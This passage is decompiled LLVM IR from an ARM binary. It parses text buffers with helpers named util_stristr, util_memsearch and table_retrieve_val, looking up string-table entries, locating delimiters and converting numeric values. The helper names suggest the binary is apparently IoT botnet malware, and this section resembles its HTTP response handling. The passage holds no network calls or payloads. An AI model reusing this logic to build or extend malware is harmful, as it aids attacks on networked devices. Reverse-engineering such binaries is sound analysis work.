  %v4_91ac = call i32 @util_stristr(i8* %v3_91ac, i32 %v0_91a0, i32 %v3_919c)
  store i32 %v4_91ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_91b0 = icmp eq i32 %v4_91ac, 0
  store i1 %v2_91b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_91b0, label %.thread26, label %bb187

bb187:                                            ; preds = %bb186
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_91b8 = load i32, i32* @sl, align 4
  %v3_91b8 = add i32 %v2_91b8, 4
  %v4_91b8 = inttoptr i32 %v3_91b8 to i32*
  store i32 1, i32* %v4_91b8, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb186, %dec_label_pc_9118, %.thread25, %bb187
  store i32 0, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_91c8 = load i32, i32* @sl, align 4
  %v2_91c8 = add i32 %v1_91c8, 8
  %v3_91c8 = inttoptr i32 %v2_91c8 to i32*
  store i32 0, i32* %v3_91c8, align 4
  %v3_91cc = call i32 @table_retrieve_val(i32 48, i32* null)
  %v0_91d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91d0, i32* @r1, align 4
  store i32 %v3_91cc, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_91dc = call i32 @util_stristr(i8* %tmp169, i32 %v0_91d0, i32 %v3_91cc)
  store i32 %v4_91dc, i32* %r0.global-to-local, align 4
  %v2_91e4 = icmp eq i32 %v4_91dc, -1
  store i1 %v2_91e4, i1* %cpsr_c.global-to-local, align 1
  %v7_91e4 = icmp eq i32 %v4_91dc, -1
  store i1 %v7_91e4, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_91e4, label %.thread27, label %dec_label_pc_91f0

dec_label_pc_91f0:                                ; preds = %.thread26
  %v0_91f0 = load i32, i32* @r7, align 4
  store i32 %v0_91f0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_91f8 = inttoptr i32 %v0_91f0 to i32*
  %v3_91f8 = call i32 @table_retrieve_val(i32 48, i32* %v2_91f8)
  %v0_91fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91fc, i32* @r1, align 4
  store i32 %v3_91f8, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9208 = call i32 @util_stristr(i8* %tmp169, i32 %v0_91fc, i32 %v3_91f8)
  store i32 %v4_9208, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %ip.global-to-local, align 4
  %v2_9210 = add i32 %v4_9208, %v2_827c
  %v3_9210 = inttoptr i32 %v2_9210 to i8*
  %v4_9210 = load i8, i8* %v3_9210, align 1
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9218 = icmp ugt i8 %v4_9210, 31
  store i1 %v2_9218, i1* %cpsr_c.global-to-local, align 1
  %v7_9218 = icmp eq i8 %v4_9210, 32
  store i1 %v7_9218, i1* %cpsr_z.global-to-local, align 1
  %v2_9220 = zext i1 %v7_9218 to i32
  %v2_9220.v4_9208 = add i32 %v2_9220, %v4_9208
  store i32 %v2_9220.v4_9208, i32* @r4, align 4
  %v2_9224 = add i32 %v2_9220.v4_9208, %v2_827c
  store i32 %v2_9224, i32* @r5, align 4
  store i32 %v2_9224, i32* %r0.global-to-local, align 4
  %v1_922c = load i32, i32* %fp.global-to-local, align 4
  %v2_922c = sub i32 %v1_922c, %v2_9220.v4_9208
  store i32 %v2_922c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9238 = call i32 @util_memsearch(i32 %v2_9224, i32 %v2_922c, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2)
  store i32 %v5_9238, i32* %r0.global-to-local, align 4
  %v2_923c = icmp eq i32 %v5_9238, -1
  store i1 %v2_923c, i1* %cpsr_c.global-to-local, align 1
  %v7_923c = icmp eq i32 %v5_9238, -1
  store i1 %v7_923c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_923c, label %.thread27, label %dec_label_pc_9244

dec_label_pc_9244:                                ; preds = %dec_label_pc_91f0
  %v2_9244 = icmp ne i32 %v5_9238, 0
  store i1 %v2_9244, i1* %cpsr_c.global-to-local, align 1
  %v7_9244 = icmp eq i32 %v5_9238, 1
  store i1 %v7_9244, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r1.global-to-local, align 4
  %v7_924c = icmp slt i32 %v5_9238, 2
  br i1 %v7_924c, label %bb189, label %bb188

bb188:                                            ; preds = %dec_label_pc_9244
  %v9_924c = add i32 %v5_9238, -2
  store i32 %v9_924c, i32* %r0.global-to-local, align 4
  br label %bb189

bb189:                                            ; preds = %dec_label_pc_9244, %bb188
  %v1_9254 = phi i32 [ %v5_9238, %dec_label_pc_9244 ], [ %v9_924c, %bb188 ]
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v2_9254 = add i32 %v1_9254, %v2_8710
  %v1_9258 = load i32, i32* @r4, align 4
  %v2_9258 = add i32 %v2_9254, %v1_9258
  store i32 %v2_9258, i32* %r3.global-to-local, align 4
  %v0_925c = load i32, i32* @r7, align 4
  %v1_925c = trunc i32 %v0_925c to i8
  %v3_925c = load i32, i32* @r6, align 4
  %v4_925c = add i32 %v3_925c, %v2_9258
  %v5_925c = inttoptr i32 %v4_925c to i8*
  store i8 %v1_925c, i8* %v5_925c, align 1
  %v0_9260 = load i32, i32* @r5, align 4
  store i32 %v0_9260, i32* %r0.global-to-local, align 4
  %v1_9264 = inttoptr i32 %v0_9260 to i8*
  %v2_9264 = call i32 @util_strlen(i8* %v1_9264)
  %v0_9268 = load i32, i32* @r7, align 4
  store i32 %v0_9268, i32* %r1.global-to-local, align 4
  store i32 %v2_9264, i32* @r4, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v2_9274 = inttoptr i32 %v0_9268 to i32*
  %v3_9274 = call i32 @table_retrieve_val(i32 49, i32* %v2_9274)
  %v0_9278 = load i32, i32* @r4, align 4
  store i32 %v0_9278, i32* @r1, align 4
  store i32 %v3_9274, i32* %r2.global-to-local, align 4
  %v0_9280 = load i32, i32* @r5, align 4
  store i32 %v0_9280, i32* %r0.global-to-local, align 4
  %v3_9284 = inttoptr i32 %v0_9280 to i8*
  %v4_9284 = call i32 @util_stristr(i8* %v3_9284, i32 %v0_9278, i32 %v3_9274)
  store i32 %v4_9284, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9288 = icmp eq i32 %v4_9284, 0
  store i1 %v2_9288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9288, label %.thread27, label %bb190

bb190:                                            ; preds = %bb189
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9290 = load i32, i32* @sl, align 4
  %v3_9290 = add i32 %v2_9290, 8
  %v4_9290 = inttoptr i32 %v3_9290 to i32*
  store i32 1, i32* %v4_9290, align 4
  br label %.thread27

.thread27:                                        ; preds = %bb189, %dec_label_pc_91f0, %.thread26, %bb190
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_929c = call i32 @table_retrieve_val(i32 47, i32* null)
  %v0_92a0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_92a0, i32* @r1, align 4
  store i32 %v3_929c, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_92ac = call i32 @util_stristr(i8* %tmp169, i32 %v0_92a0, i32 %v3_929c)
  store i32 %v4_92ac, i32* %r0.global-to-local, align 4
  %v2_92b0 = icmp eq i32 %v4_92ac, -1
  store i1 %v2_92b0, i1* %cpsr_c.global-to-local, align 1
  %v7_92b0 = icmp eq i32 %v4_92ac, -1
  store i1 %v7_92b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92b0, label %.thread, label %dec_label_pc_92c8

.thread:                                          ; preds = %.thread27
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92c0 = load i32, i32* @sl, align 4
  %v3_92c0 = add i32 %v2_92c0, 12
  %v4_92c0 = inttoptr i32 %v3_92c0 to i32*
  store i32 0, i32* %v4_92c0, align 4
  br label %dec_label_pc_934c

dec_label_pc_92c8:                                ; preds = %.thread27
  store i32 -20773, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_92d0 = call i32 @table_retrieve_val(i32 47, i32* null)
  %v0_92d4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_92d4, i32* @r1, align 4
  store i32 %v3_92d0, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_92e0 = call i32 @util_stristr(i8* %tmp169, i32 %v0_92d4, i32 %v3_92d0)
  store i32 %v4_92e0, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r2.global-to-local, align 4
  %v2_92e8 = add i32 %v4_92e0, %v2_827c
  %v3_92e8 = inttoptr i32 %v2_92e8 to i8*
  %v4_92e8 = load i8, i8* %v3_92e8, align 1
  %v2_92ec = icmp ugt i8 %v4_92e8, 31
  store i1 %v2_92ec, i1* %cpsr_c.global-to-local, align 1
  %v7_92ec = icmp eq i8 %v4_92e8, 32
  store i1 %v7_92ec, i1* %cpsr_z.global-to-local, align 1
  %v2_92f8 = zext i1 %v7_92ec to i32
  %v2_92f8.v4_92e0 = add i32 %v2_92f8, %v4_92e0
  store i32 %v2_92f8.v4_92e0, i32* @r4, align 4
  %v2_92fc = add i32 %v2_92f8.v4_92e0, %v2_827c
  store i32 %v2_92fc, i32* @r5, align 4
  store i32 %v2_92fc, i32* %r0.global-to-local, align 4
  %v1_9304 = load i32, i32* %fp.global-to-local, align 4
  %v2_9304 = sub i32 %v1_9304, %v2_92f8.v4_92e0
  store i32 %v2_9304, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9310 = call i32 @util_memsearch(i32 %v2_92fc, i32 %v2_9304, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2)
  store i32 %v5_9310, i32* %r0.global-to-local, align 4
  %v2_9314 = icmp eq i32 %v5_9310, -1
  store i1 %v2_9314, i1* %cpsr_c.global-to-local, align 1
  %v7_9314 = icmp eq i32 %v5_9310, -1
  store i1 %v7_9314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9314, label %dec_label_pc_934c, label %dec_label_pc_931c

dec_label_pc_931c:                                ; preds = %dec_label_pc_92c8
  %v2_931c = icmp ne i32 %v5_9310, 0
  store i1 %v2_931c, i1* %cpsr_c.global-to-local, align 1
  %v7_931c = icmp eq i32 %v5_9310, 1
  store i1 %v7_931c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %ip.global-to-local, align 4
  %v7_9324 = icmp slt i32 %v5_9310, 2
  br i1 %v7_9324, label %bb192, label %bb191

bb191:                                            ; preds = %dec_label_pc_931c
  %v9_9324 = add i32 %v5_9310, -2
  store i32 %v9_9324, i32* %r0.global-to-local, align 4
  br label %bb192

bb192:                                            ; preds = %dec_label_pc_931c, %bb191
  %v1_932c = phi i32 [ %v5_9310, %dec_label_pc_931c ], [ %v9_9324, %bb191 ]
  store i32 %v2_8710, i32* %ip.global-to-local, align 4
  %v2_932c = add i32 %v1_932c, %v2_8710
  %v1_9330 = load i32, i32* @r4, align 4
  %v2_9330 = add i32 %v2_932c, %v1_9330
  store i32 %v2_9330, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9338 = load i32, i32* @r5, align 4
  store i32 %v0_9338, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_9340 = load i32, i32* @r6, align 4
  %v4_9340 = add i32 %v3_9340, %v2_9330
  %v5_9340 = inttoptr i32 %v4_9340 to i8*
  store i8 0, i8* %v5_9340, align 1
  %v2_9344 = inttoptr i32 %v0_9338 to i8*
  %v3_9344 = call i32 @util_atoi(i8* %v2_9344, i32 10)
  store i32 %v3_9344, i32* %r0.global-to-local, align 4
  %v1_9348 = load i32, i32* @sl, align 4
  %v2_9348 = add i32 %v1_9348, 12
  %v3_9348 = inttoptr i32 %v2_9348 to i32*
  store i32 %v3_9344, i32* %v3_9348, align 4
  br label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %.thread, %dec_label_pc_92c8, %bb192
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_9350:                                ; preds = %dec_label_pc_951c, %dec_label_pc_949c, %dec_label_pc_934c
  %v1_935c = phi i32 [ 0, %dec_label_pc_934c ], [ %v0_949c, %dec_label_pc_949c ], [ %v1_935c.pre.pre, %dec_label_pc_951c ]
  store i32 %v2_827c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_935c = add i32 %v1_935c, %v2_827c
  store i32 %v2_935c, i32* @r4, align 4
  %v3_9360 = call i32 @table_retrieve_val(i32 46, i32* null)
  %v0_9364 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9364, i32* @r1, align 4
  store i32 %v3_9360, i32* %r2.global-to-local, align 4
  %v0_936c = load i32, i32* @r4, align 4
  store i32 %v0_936c, i32* %r0.global-to-local, align 4
  %v3_9370 = inttoptr i32 %v0_936c to i8*
  %v4_9370 = call i32 @util_stristr(i8* %v3_9370, i32 %v0_9364, i32 %v3_9360)
  store i32 %v4_9370, i32* %r0.global-to-local, align 4
  store i32 -20773, i32* %ip.global-to-local, align 4
  %v2_937c = icmp eq i32 %v4_9370, -1
  store i1 %v2_937c, i1* %cpsr_c.global-to-local, align 1
  %v7_937c = icmp eq i32 %v4_9370, -1
  store i1 %v7_937c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_937c, label %dec_label_pc_9588, label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_9350
  %v0_9388 = load i32, i32* @sl, align 4
  %v1_9388 = add i32 %v0_9388, 16
  %v2_9388 = inttoptr i32 %v1_9388 to i32*
  %v3_9388 = load i32, i32* %v2_9388, align 4
  store i32 %v3_9388, i32* %r3.global-to-local, align 4
  %v2_938c = icmp ugt i32 %v3_9388, 3
  store i1 %v2_938c, i1* %cpsr_c.global-to-local, align 1
  %v7_938c = icmp eq i32 %v3_9388, 4
  store i1 %v7_938c, i1* %cpsr_z.global-to-local, align 1
  %v8_9390 = icmp sgt i32 %v3_9388, 4
  br i1 %v8_9390, label %dec_label_pc_9588, label %dec_label_pc_9394

dec_label_pc_9394:                                ; preds = %dec_label_pc_9388
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v3_939c = call i32 @table_retrieve_val(i32 46, i32* null)
  %v0_93a0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_93a0, i32* @r1, align 4
  store i32 %v3_939c, i32* %r2.global-to-local, align 4
  %v0_93a8 = load i32, i32* @r4, align 4
  store i32 %v0_93a8, i32* %r0.global-to-local, align 4
  %v3_93ac = inttoptr i32 %v0_93a8 to i8*
  %v4_93ac = call i32 @util_stristr(i8* %v3_93ac, i32 %v0_93a0, i32 %v3_939c)
  store i32 %v4_93ac, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v1_93b4 = load i32, i32* @r5, align 4
  %v2_93b4 = add i32 %v1_93b4, %v4_93ac
  store i32 %v2_93b4, i32* @r8, align 4
  %v2_93b8 = add i32 %v2_93b4, %v2_827c
  %v3_93b8 = inttoptr i32 %v2_93b8 to i8*
  %v4_93b8 = load i8, i8* %v3_93b8, align 1
  %v6_93b8 = zext i8 %v4_93b8 to i32
  store i32 %v6_93b8, i32* %r3.global-to-local, align 4
  %v2_93bc = icmp ugt i8 %v4_93b8, 31
  store i1 %v2_93bc, i1* %cpsr_c.global-to-local, align 1
  %v7_93bc = icmp eq i8 %v4_93b8, 32
  store i1 %v7_93bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93bc, label %bb193, label %bb194

bb193:                                            ; preds = %dec_label_pc_9394
  %v2_93c0 = add i32 %v4_93ac, 1
  store i32 %v2_93c0, i32* %r0.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %dec_label_pc_9394, %bb193
  %v1_93d0 = phi i32 [ %v4_93ac, %dec_label_pc_9394 ], [ %v2_93c0, %bb193 ]
  %v1_93c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_93c4 = sub i32 %v1_93c4, %v1_93b4
  store i32 %v2_93c4, i32* %r3.global-to-local, align 4
  %v2_93c8 = sub i32 %v2_93c4, %v1_93d0
  store i32 %v2_93c8, i32* @r7, align 4
  %v0_93cc = load i32, i32* @r4, align 4
  %v2_93cc = add i32 %v0_93cc, %v1_93d0
  store i32 %v2_93cc, i32* @r6, align 4
  br i1 %v7_93bc, label %bb195, label %bb196

bb195:                                            ; preds = %bb194
  %v3_93d0 = add i32 %v1_93d0, %v1_93b4
  store i32 %v3_93d0, i32* @r8, align 4
  br label %bb196

bb196:                                            ; preds = %bb194, %bb195
  store i32 %v2_93c8, i32* %r1.global-to-local, align 4
  store i32 %v2_93cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_93e4 = call i32 @util_memsearch(i32 %v2_93cc, i32 %v2_93c8, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2)
  store i32 %v5_93e4, i32* %r0.global-to-local, align 4
  %v2_93e8 = icmp eq i32 %v5_93e4, -1
  store i1 %v2_93e8, i1* %cpsr_c.global-to-local, align 1
  %v7_93e8 = icmp eq i32 %v5_93e4, -1
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_93e4, i32* @r4, align 4
  br i1 %v7_93e8, label %dec_label_pc_949c, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %bb196
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v2_93f8 = icmp ne i32 %v5_93e4, 0
  store i1 %v2_93f8, i1* %cpsr_c.global-to-local, align 1
  %v7_93f8 = icmp eq i32 %v5_93e4, 1
  store i1 %v7_93f8, i1* %cpsr_z.global-to-local, align 1
  %v7_93fc = icmp slt i32 %v5_93e4, 2
  br i1 %v7_93fc, label %bb198, label %bb197

bb197:                                            ; preds = %dec_label_pc_93f4
  %v9_93fc = add i32 %v5_93e4, -2
  store i32 %v9_93fc, i32* @r4, align 4
  br label %bb198

bb198:                                            ; preds = %dec_label_pc_93f4, %bb197
  %v1_9400 = load i32, i32* @r8, align 4
  %v2_9400 = add i32 %v1_9400, %v2_827c
  store i32 %v2_9400, i32* @r5, align 4
  %v0_9404 = load i32, i32* @r6, align 4
  store i32 %v0_9404, i32* %r0.global-to-local, align 4
  %v0_9408 = load i32, i32* @r7, align 4
  store i32 %v0_9408, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a798.50 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9414 = call i32 @util_memsearch(i32 %v0_9404, i32 %v0_9408, i32 ptrtoint (i32* @global_var_1a798.50 to i32), i32 1)
  store i32 %v4_9414, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9418 = icmp eq i32 %v4_9414, 0
  store i1 %v2_9418, i1* %cpsr_z.global-to-local, align 1
  %tmp199 = icmp slt i32 %v4_9414, 1
  br i1 %tmp199, label %.dec_label_pc_9438_crit_edge, label %dec_label_pc_9420

.dec_label_pc_9438_crit_edge:                     ; preds = %bb198
  %v1_9440.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9438

dec_label_pc_9420:                                ; preds = %bb198
  %v0_9420 = load i32, i32* @r6, align 4
  store i32 %v0_9420, i32* %r0.global-to-local, align 4
  %v0_9424 = load i32, i32* @r7, align 4
  store i32 %v0_9424, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a798.50 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9430 = call i32 @util_memsearch(i32 %v0_9420, i32 %v0_9424, i32 ptrtoint (i32* @global_var_1a798.50 to i32), i32 1)
  store i32 %v4_9430, i32* %r0.global-to-local, align 4
  %v1_9434 = add i32 %v4_9430, -1
  store i32 %v1_9434, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %.dec_label_pc_9438_crit_edge, %dec_label_pc_9420
  %v1_9440 = phi i32 [ %v1_9440.pre, %.dec_label_pc_9438_crit_edge ], [ %v1_9434, %dec_label_pc_9420 ]
  %v2_9440 = add i32 %v1_9440, %v2_8710
  store i32 -20773, i32* @lr, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_944c = load i32, i32* @r8, align 4
  %v2_944c = add i32 %v2_9440, %v1_944c
  store i32 %v2_944c, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v4_9454 = add i32 %v2_944c, -20773
  %v5_9454 = inttoptr i32 %v4_9454 to i8*
  store i8 0, i8* %v5_9454, align 1
  %storemerge7.in.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9474.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9474

dec_label_pc_9460:                                ; preds = %dec_label_pc_9474
  br i1 %v7_9464, label %dec_label_pc_94a4, label %dec_label_pc_946c

dec_label_pc_946c:                                ; preds = %dec_label_pc_9460
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9474

dec_label_pc_9474:                                ; preds = %dec_label_pc_9438, %dec_label_pc_946c
  %v0_9474 = phi i32 [ %v0_9460, %dec_label_pc_946c ], [ %v0_9474.pre, %dec_label_pc_9438 ]
  %storemerge7.in = phi i32 [ %v1_9488, %dec_label_pc_946c ], [ %storemerge7.in.pre, %dec_label_pc_9438 ]
  %storemerge7 = inttoptr i32 %storemerge7.in to i8*
  store i8* %storemerge7, i8** %stack_var_-44, align 4
  store i32 %v0_9474, i32* %r0.global-to-local, align 4
  %v1_9478 = inttoptr i32 %v0_9474 to i8*
  %v2_9478 = call i32 @util_strlen(i8* %v1_9478)
  store i32 %v2_9478, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9480 = load i8*, i8** %stack_var_-44, align 4
  %v4_9480 = ptrtoint i8* %v3_9480 to i32
  store i32 %v4_9480, i32* %r4.global-to-local, align 4
  %v3_9484 = icmp uge i32 %v2_9478, %v4_9480
  store i1 %v3_9484, i1* %cpsr_c.global-to-local, align 1
  %v9_9484 = inttoptr i32 %v2_9478 to i8*
  %v11_9484 = icmp eq i32 %v2_9478, %v4_9480
  store i1 %v11_9484, i1* %cpsr_z.global-to-local, align 1
  %v1_9488 = add i32 %v4_9480, 1
  store i32 %v1_9488, i32* %ip.global-to-local, align 4
  %v10_948c = icmp sgt i8* %v9_9484, %v3_9480
  %v0_9460 = load i32, i32* @r5, align 4
  %v2_9460 = add i32 %v0_9460, %v4_9480
  %v3_9460 = inttoptr i32 %v2_9460 to i8*
  %v4_9460 = load i8, i8* %v3_9460, align 1
  %v6_9460 = zext i8 %v4_9460 to i32
  store i32 %v6_9460, i32* %r3.global-to-local, align 4
  %v2_9464 = icmp ugt i8 %v4_9460, 60
  store i1 %v2_9464, i1* %cpsr_c.global-to-local, align 1
  %v7_9464 = icmp eq i8 %v4_9460, 61
  store i1 %v7_9464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_948c, label %dec_label_pc_9460, label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9474
  br i1 %v7_9464, label %dec_label_pc_94a4, label %dec_label_pc_949c

dec_label_pc_949c:                                ; preds = %dec_label_pc_94e8, %dec_label_pc_950c, %dec_label_pc_9490, %bb196
  %v0_949c = load i32, i32* @r8, align 4
  store i32 %v0_949c, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_94a4:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9490
  %v0_94a4 = load i32, i32* @sl, align 4
  %v1_94a4 = add i32 %v0_94a4, 16
  %v2_94a4 = inttoptr i32 %v1_94a4 to i32*
  %v3_94a4 = load i32, i32* %v2_94a4, align 4
  store i32 %v3_94a4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_94b0 = icmp eq i32 %v3_94a4, 0
  store i1 %v2_94b0, i1* %cpsr_z.global-to-local, align 1
  store i8* null, i8** %stack_var_-44, align 4
  %tmp200 = icmp slt i32 %v3_94a4, 1
  br i1 %tmp200, label %dec_label_pc_950c, label %dec_label_pc_94bc

dec_label_pc_94bc:                                ; preds = %dec_label_pc_94a4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_94e8

dec_label_pc_94c4:                                ; preds = %dec_label_pc_94e8
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_94c8 = load i8*, i8** %stack_var_-44, align 4
  %v4_94c8 = ptrtoint i8* %v3_94c8 to i32
  store i32 %v4_94c8, i32* %r3.global-to-local, align 4
  %v0_94cc = load i32, i32* @sl, align 4
  %v1_94cc = add i32 %v0_94cc, 16
  %v2_94cc = inttoptr i32 %v1_94cc to i32*
  %v3_94cc = load i32, i32* %v2_94cc, align 4
  %v1_94d0 = add i32 %v4_94c8, 1
  store i32 %v1_94d0, i32* %ip.global-to-local, align 4
  %v3_94d4 = icmp uge i32 %v3_94cc, %v1_94d0
  store i1 %v3_94d4, i1* %cpsr_c.global-to-local, align 1
  %v9_94d4 = icmp eq i32 %v3_94cc, %v1_94d0
  store i1 %v9_94d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_94d0, i32* %r1.global-to-local, align 4
  %v5_94e0 = inttoptr i32 %v1_94d0 to i8*
  store i8* %v5_94e0, i8** %stack_var_-44, align 4
  %v7_94e4 = icmp sgt i32 %v3_94cc, %v1_94d0
  %v0_94f4.pre = load i32, i32* @r5, align 4
  br i1 %v7_94e4, label %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge, label %dec_label_pc_950c

dec_label_pc_94c4.dec_label_pc_94e8_crit_edge:    ; preds = %dec_label_pc_94c4
  %v0_94f8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_94e8

dec_label_pc_94e8:                                ; preds = %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge, %dec_label_pc_94bc
  %v0_94f8 = phi i32 [ %v0_94f8.pre, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ %v4_9480, %dec_label_pc_94bc ]
  %v0_94f4 = phi i32 [ %v0_94f4.pre, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ %v0_9460, %dec_label_pc_94bc ]
  %v0_94e8 = phi i32 [ %v1_94d0, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ 0, %dec_label_pc_94bc ]
  %v1_94e8 = and i32 %v0_94e8, 33554432
  %v2_94e8 = icmp ne i32 %v1_94e8, 0
  store i1 %v2_94e8, i1* %cpsr_c.global-to-local, align 1
  %v3_94e8 = mul i32 %v0_94e8, 128
  %v1_94ec = add i32 %v3_94e8, 1472
  %v0_94f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_94f0 = add i32 %v1_94ec, %v0_94f0
  store i32 %v2_94f0, i32* %r1.global-to-local, align 4
  store i32 %v0_94f4, i32* %r0.global-to-local, align 4
  store i32 %v0_94f8, i32* %r2.global-to-local, align 4
  %v4_94fc = inttoptr i32 %v0_94f4 to i8*
  %v5_94fc = call i32 @util_strncmp(i8* %v4_94fc, i32 %v2_94f0, i32 %v0_94f8)
  store i32 %v5_94fc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9500 = icmp eq i32 %v5_94fc, 0
  store i1 %v2_9500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9500, label %dec_label_pc_94c4, label %dec_label_pc_949c

dec_label_pc_950c:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_94a4
  %v0_950c = phi i32 [ %v0_9460, %dec_label_pc_94a4 ], [ %v0_94f4.pre, %dec_label_pc_94c4 ]
  store i32 %v0_950c, i32* %r0.global-to-local, align 4
  %v1_9510 = inttoptr i32 %v0_950c to i8*
  %v2_9510 = call i32 @util_strlen(i8* %v1_9510)
  store i32 %v2_9510, i32* %r0.global-to-local, align 4
  %v2_9514 = icmp ugt i32 %v2_9510, 126
  store i1 %v2_9514, i1* %cpsr_c.global-to-local, align 1
  %v7_9514 = icmp eq i32 %v2_9510, 127
  store i1 %v7_9514, i1* %cpsr_z.global-to-local, align 1
  %v8_9518 = icmp sgt i32 %v2_9510, 127
  br i1 %v8_9518, label %dec_label_pc_949c, label %dec_label_pc_951c

dec_label_pc_951c:                                ; preds = %dec_label_pc_950c
  %v0_951c = load i32, i32* @sl, align 4
